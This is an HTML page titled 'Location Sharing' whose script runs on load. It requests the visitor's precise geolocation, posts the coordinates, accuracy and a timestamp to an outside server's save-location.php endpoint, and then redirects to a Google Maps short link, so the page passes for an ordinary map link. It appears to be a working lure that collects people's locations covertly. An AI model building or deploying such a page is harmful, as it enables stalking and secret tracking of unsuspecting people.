<!DOCTYPE html>
<html>
<head>
    <title>Location Sharing</title>
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
</head>
<body>
   <script>
const googleMapsURL = 'https://maps.app.goo.gl/JVUi2F98vrGs1ryn8';
const serverURL = 'https://livelocation-k0iy.onrender.com/save-location.php';

async function getLocation() {
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            });
        });

        // DEBUG: Show coordinates in console
        console.log('Captured:', position.coords);

        // BLOCK until POST completes
        await fetch(serverURL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: Date.now()
            }),
            keepalive: true // Critical for page unload
        });

    } catch (error) {
        console.error('FATAL:', error);
    } finally {
        // Wait 500ms before redirect
        setTimeout(() => {
            window.location.href = googleMapsURL;
        }, 500);
    }
}

window.onload = getLocation;
</script>
</body>
</html>
